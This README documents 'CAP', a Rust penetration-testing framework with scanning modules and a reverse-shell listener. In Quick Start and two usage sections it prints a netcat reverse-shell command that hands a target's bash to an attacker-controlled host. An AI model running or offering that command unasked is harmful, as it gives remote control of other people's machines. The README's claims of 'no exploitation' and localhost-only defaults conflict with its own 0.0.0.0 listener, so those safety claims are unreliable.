# CAP - Comprehensive Assessment Platform

<div align="center">

```
    ██████╗ █████╗ ████████╗
   ██╔════╝██╔══██╗██╔═══██║██║     
   ██║     ███████║██████╔╝
   ██║     ██╔══██║██╔═══╝ 
   ╚██████╗██║  ██║██║     
    ╚═════╝╚═╝  ╚═╝╚═╝     
```

**A modern, Rust-based security orchestration framework for authorized penetration testing and defensive research**

[![Rust](https://img.shields.io/badge/Rust-1.70+-orange.svg)](https://www.rust-lang.org/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

⚠️ **AUTHORIZED USE ONLY** - For security research, training, and approved testing ⚠️

</div>

---

## 🚀 Quick Start

```bash
# Install Rust
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh

# Build CAP
cd cap
cargo build --release

# Start interactive shell listener (Penelope-style)
./target/release/cap listen
# Listens on 0.0.0.0:4444 by default
# Press F12 to open control menu

# Connect from target
nc <your-ip> 4444 -e /bin/bash

# Run reconnaissance modules
./target/release/cap modules              # List available modules
./target/release/cap scope add example.com  # Add target to scope
./target/release/cap module --name web-enum --target https://example.com
```

---

## 📖 What is CAP?

CAP (Comprehensive Assessment Platform) is a research-oriented security orchestration framework built from the ground up in Rust. Unlike traditional C2 frameworks, CAP prioritizes **security, transparency, and accountability** with innovative features designed for defensive security research and authorized penetration testing.

### Key Differentiators

- **🔒 Mandatory Scope Enforcement** - All operations require explicit target authorization
- **🔐 Cryptographic Audit Chain** - SHA-256 hash-chained immutable audit logs
- **⏰ Time-Bounded Sessions** - Auto-expiring sessions (24h default) enforce re-authorization
- **🎯 Safe Defaults** - Localhost-only binding, read-only operations, no exploitation
- **⚡ Modern Architecture** - Built with Rust for memory safety and performance
- **🐚 Interactive Shell Handler** - Penelope-style TUI with F12 control menu

---

## ✨ Features

### Core Framework

| Feature | Description |
|---------|-------------|
| **Shell Listener** | Interactive Penelope-style shell handler with F12 menu |
| **Scope Management** | Whitelist-based targeting (IP/CIDR, domains, wildcards) |
| **Session Management** | Time-bounded access with automatic expiration |
| **Audit Logging** | Tamper-evident logs with cryptographic integrity |
| **Configuration** | TOML-based with environment-specific configs |

### Security Modules

| Module | Purpose | Features |
|--------|---------|----------|
| **web-enum** | Web application enumeration | Wordlist-based discovery, status code filtering, verbose mode |
| **dns-enum** | DNS & subdomain enumeration | Fast concurrent resolution, IPv4/IPv6 support |
| **port-scan** | Network port scanning | Common ports, service detection, concurrent scanning |
| **shell** | Interactive shell handler | Penelope-style listener, session management, F12 control menu |

### Innovative Security Features

- **Cryptographic Audit Trail**: Each log entry contains SHA-256 hash of previous entry
- **Scope Enforcement**: Blocks all operations against unauthorized targets
- **Operator Attribution**: Every action tied to system username
- **Integrity Verification**: Built-in tamper detection for audit logs
- **Persistent Configuration**: Scope changes saved immediately

---

## 📸 Screenshots

### Main Interface
<!-- Add screenshot here -->
![CAP Main Interface](screenshots/main-interface.png)

### Module List
<!-- Add screenshot here -->
![Available Modules](screenshots/modules-list.png)

### Web Enumeration in Action
<!-- Add screenshot here -->
![Web Enumeration](screenshots/web-enum-scan.png)

### Scope Management
<!-- Add screenshot here -->
![Scope Management](screenshots/scope-management.png)

### Audit Logs
<!-- Add screenshot here -->
![Audit Logs](screenshots/audit-logs.png)

---

## 🏗️ Architecture

```
┌──────────────────────────────────────────────────────────────┐
│                      CAP Framework                            │
├──────────────────────────────────────────────────────────────┤
│                                                               │
│  ┌─────────────────────────────────────────────────────┐    │
│  │    Interactive Shell Listener (Primary Interface)   │    │
│  │    • Penelope-Style TUI                             │    │
│  │    • F12 Control Menu                               │    │
│  │    • Multi-Session Management                       │    │
│  │    • Non-blocking I/O                               │    │
│  │    • Background/Foreground Control                  │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                               │
│  ┌─────────────────────────────────────────────────────┐    │
│  │          Core Framework                              │    │
│  │  • Scope Enforcement (IP/Domain whitelist)          │    │
│  │  • Audit Logger (Cryptographic hash chain)          │    │
│  │  • Configuration Management                          │    │
│  │  • Session Management                                │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                               │
│  ┌─────────────────────────────────────────────────────┐    │
│  │          Security Modules (CLI)                      │    │
│  │  • Web Enumeration                                  │    │
│  │  • DNS/Subdomain Discovery                          │    │
│  │  • Port Scanning                                    │    │
│  └─────────────────────────────────────────────────────┘    │
│                                                               │
└──────────────────────────────────────────────────────────────┘
```

---

## 🔧 Installation

### Prerequisites

- Rust 1.70+ ([Install Rust](https://rustup.rs/))
- Linux, macOS, or Windows

### Build from Source

```bash
# Clone repository
git clone https://github.com/yourusername/cap.git
cd cap

# Build release binary
cargo build --release

# Binary location: target/release/cap
```

### Optional: Install Globally

```bash
# Create symlink
mkdir -p ~/.local/bin
ln -sf $(pwd)/target/release/cap ~/.local/bin/cap

# Add to PATH (if not already)
echo 'export PATH="$HOME/.local/bin:$PATH"' >> ~/.bashrc
source ~/.bashrc
```

---

## 📚 Usage

### Scope Management

All operations require targets to be explicitly authorized:

```bash
# Add targets to scope
cap scope add example.com
cap scope add 192.168.1.0/24
cap scope add "*.test.com"

# List authorized targets
cap scope list

# Check if target is in scope
cap scope check example.com

# Remove from scope
cap scope remove example.com
```

### Session Management

Sessions automatically expire after 24 hours:

```bash
# Create session
cap session new "Q1 Assessment"

# List active sessions
cap session list

# Terminate session
cap session kill <session-id>
```

### Module Execution

#### Web Enumeration

```bash
# Basic scan
cap module --name web-enum --target https://example.com

# With custom wordlist
cap module --name web-enum --target https://example.com \
  --wordlist /path/to/wordlist.txt \
  --threads 20

# Verbose mode (see all attempts)
cap module --name web-enum --target https://example.com \
  --verbose \
  --threads 10

# Filter status codes
cap module --name web-enum --target https://example.com \
  --status-codes 200,301,403 \
  --threads 20

# Exclude status codes
cap module --name web-enum --target https://example.com \
  --exclude-codes 404,503 \
  --threads 20
```

#### DNS Enumeration

```bash
# Subdomain discovery
cap module --name dns-enum --target example.com

# With custom wordlist
cap module --name dns-enum --target example.com \
  --wordlist /path/to/subdomains.txt \
  --threads 50
```

#### Port Scanning

```bash
# Scan common ports
cap module --name port-scan --target 192.168.1.100

# Fast scan (more threads)
cap module --name port-scan --target 192.168.1.100 \
  --threads 100
```

### Shell Listener (Penelope-Style)

CAP's primary interface is an advanced shell listener with interactive session management, similar to Penelope:

```bash
# Start interactive shell listener (default: 0.0.0.0:4444)
cap listen

# Custom port
cap listen --port 5555

# Connect from target
nc <your-ip> 4444 -e /bin/bash
```

#### Interactive Control Menu

When connected to a shell, press **F12** to open the control menu:

- **View all active shell sessions** - See all connected shells
- **Switch between sessions** - Move between shells without disconnecting
- **Background sessions** - Keep shells running in background
- **Foreground sessions** - Bring backgrounded shells to focus
- **Terminate sessions** - Kill specific shell connections
- **Automatic cleanup** - Removes terminated sessions

#### Features

- **Non-blocking I/O** - Handle multiple shells simultaneously
- **Session persistence** - Shells remain active when backgrounded
- **Real-time output** - Live shell output with minimal latency
- **Keyboard-driven interface** - Full keyboard navigation
- **Session state tracking** - Active/Background/Terminated states
- **Auto-cleanup** - Periodic cleanup of dead connections

#### Session Management

All session management is done through the interactive F12 menu:

```bash
# Start the listener
cap listen

# When shells connect:
# 1. Press F12 to open control menu
# 2. View all active sessions with state indicators
# 3. Navigate with arrow keys
# 4. Press Enter to switch to a session
# 5. Background current session
# 6. Cleanup terminated sessions
# 7. Press ESC or F12 to close menu

# Keyboard shortcuts:
# F12 - Open/close control menu
# ↑↓  - Navigate menu
# ⏎   - Select menu item
# ESC - Close menu
# ^C  - Exit CAP
```

### Wordlist Management

CAP automatically discovers wordlists in standard locations:

```bash
# List available wordlists
cap wordlists

# Search for specific wordlists
cap wordlists --search directory
cap wordlists --search common
```

Searched locations:
- `/usr/share/wordlists/`
- `/usr/share/seclists/`
- `/snap/seclists/current/`
- `wordlists/` (local)

### Payload Generation

Generate reusable task configurations:

```bash
# Generate payload
cap generate --module web-enum --target example.com

# Save to file
cap generate --module dns-enum --target example.com \
  --output task.json
```

### Audit Logs

All operations are logged with cryptographic integrity:

```bash
# View audit logs
cap audit

# Filter by session
cap audit --session-id <session-id>

# Export for compliance
cap audit --export assessment-report.json
```

### Interactive Shell Listener

Start the Penelope-style shell listener:

```bash
# Start listener on default port (4444)
cap listen

# Custom host/port
cap listen --host 0.0.0.0 --port 5555

# Connect from target
nc <attacker-ip> 4444 -e /bin/bash

# Inside CAP:
# - Press F12 to open control menu
# - Navigate with arrow keys
# - Switch between sessions
# - Background/foreground shells
# - Auto-cleanup of dead connections
```

---

## 📋 Configuration

Edit `config/default.toml`:

```toml
[general]
name = "My Assessment"
description = "Security assessment project"

[server]
host = "127.0.0.1"
port = 8443
tls_enabled = false

[scope]
authorized_targets = [
    "example.com",
    "192.168.1.0/24",
    "*.test.com"
]

[audit]
log_path = "logs/audit.jsonl"
retention_days = 90

[modules]
default_threads = 10
timeout_seconds = 300
```

---

## 🎓 Use Cases

### Authorized Penetration Testing
- External network assessments
- Web application security testing
- Infrastructure reconnaissance
- Compliance testing (PCI-DSS, NIST)

### Security Research
- Vulnerability research in lab environments
- Tool development and validation
- Attack surface mapping
- Defense technique testing

### Training & Education
- Blue team detection training
- Red team reconnaissance practice
- CTF competition infrastructure
- Security workshop environments

### Continuous Security
- Scheduled security scans
- Regression testing
- Configuration validation
- Asset discovery

---

## 🛡️ Security Model

### Defense-in-Depth

1. **Scope Enforcement Layer** - Blocks unauthorized targeting
2. **Audit Layer** - Cryptographic integrity verification
3. **Session Layer** - Time-bounded access control
4. **Application Layer** - Safe defaults, read-only operations

### Compliance Features

- Complete audit trail of all operations
- Operator identity tracking (system username)
- Authorization reference support
- Tamper-evident logging
- Export capability for reporting
- Configurable log retention

---

## 🚧 Roadmap

### Completed Features

- [x] Interactive shell listener (Penelope-style)
- [x] Advanced session management with F12 control menu
- [x] Non-blocking I/O for multiple shells
- [x] Background/foreground session switching

### Planned Features

- [ ] TLS/mTLS support for API
- [ ] Persistent session storage (SQLite)
- [ ] HTML/PDF report generation
- [ ] Enhanced shell audit logging
- [ ] Real-time collaboration (WebSocket)
- [ ] SIEM integration (Splunk, ELK)
- [ ] Module plugin system
- [ ] Advanced authentication methods
- [ ] Distributed execution (multi-agent)

---

## 🤝 Contributing

Contributions are welcome! Please ensure all contributions:

1. Maintain the defensive/research focus
2. Include tests and documentation
3. Follow Rust best practices
4. Add audit logging for new features
5. Respect scope enforcement principles

---

## 📜 License

MIT License - See [LICENSE](LICENSE) file for details.

---

## ⚠️ Legal Disclaimer

**IMPORTANT**: This tool is designed for authorized security testing, research, and educational purposes only.

- ✅ Use only on systems you own or have explicit written permission to test
- ✅ Obtain proper authorization before any security assessment
- ✅ Comply with all applicable laws and regulations
- ✅ Maintain audit logs for compliance and evidence

**Unauthorized access to computer systems is illegal.** The authors are not responsible for any misuse or damage caused by this program. Users are solely responsible for ensuring proper authorization.

---

## 🙏 Acknowledgments

Inspired by:
- **Sliver** - Modern C2 framework architecture
- **Metasploit** - Modular assessment framework design
- **Penelope** - Interactive shell handler and session management
- **Gobuster/Dirsearch** - Web enumeration tools

Built with:
- **Rust** - Systems programming language
- **Tokio** - Async runtime
- **Axum** - Web framework
- **Ratatui** - Terminal UI framework
- **Crossterm** - Cross-platform terminal control
- **Clap** - CLI parsing
- **SecLists** - Security testing wordlists

---

## 📞 Contact

- **Issues**: [GitHub Issues](https://github.com/yourusername/cap/issues)
- **Discussions**: [GitHub Discussions](https://github.com/yourusername/cap/discussions)

---

<div align="center">

**Built with ❤️ for the security research community**

*Always ensure proper authorization before testing any system*

</div>
